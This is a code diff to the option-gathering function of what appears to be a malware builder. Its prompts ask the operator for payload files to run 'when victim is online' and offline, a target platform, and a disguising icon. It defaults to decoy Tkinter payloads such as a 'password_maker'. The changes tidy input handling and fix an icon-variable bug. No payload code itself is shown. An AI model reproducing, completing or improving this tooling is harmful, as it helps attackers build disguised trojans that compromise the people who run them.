@@ -120,9 +120,9 @@ def get_options(): # get all of inputs and make python file
         name = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your application name: ")).lower()      
         try:
             max_letter = int(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your max letter value(after that bot send you a link on note. its faster! | just write number without space): "))  
-        except: print(Fore.RED + "Invalid input(Just write number without space).")
-        code_addr_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your code file address for when victim is online(befor that check the imported libraries in bulder/windows-build or bulder/linux-build): ")).lower()    
-        offline_code_addr_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use your custom offline tkinter code write C if not press enter: ")).lower()    
+        except: print(Fore.RED + "Invalid input(Just write number without space)."), exit()
+        code_addr_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your code file address for when victim is online(befor that check the imported libraries in bulder/windows-build or bulder/linux-build | and you can use standard Tkinter payloads. check them out from builder/tk_payloads): ")).lower()    
+        offline_code_addr_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your code file address for when victim is offline(befor that check the imported libraries in bulder/windows-build or bulder/linux-build | and you can use standard Tkinter payloads. check them out from builder/tk_payloads/offline): ")).lower()    
         platform_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " choice your platform(windows, linux, mac): ")).lower()
         icon_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your icon file address(.ico): "))
         # validate the inputs
@@ -137,7 +137,7 @@ def get_options(): # get all of inputs and make python file
             print(Fore.RED + "This platform dosnt exist!")
             exit()
         offline_code_addr = offline_code_addr_inp if offline_code_addr_inp.endswith(".py") else "builder/tk_payloads/offline/no_internet.py"
-        icon = icon_inp if icon.endswith(".ico") else print("ERROR WHILE READING ICON"), "icongallery/icon.ico"
+        icon = icon_inp if icon_inp.endswith(".ico") else print("ERROR WHILE READING ICON"), "icongallery/icon.ico"
         print(f"ICON : {icon}")
         code_addr = code_addr_inp if code_addr_inp.endswith(".py") else "builder/tk_payloads/password_maker.py"
         # make python file
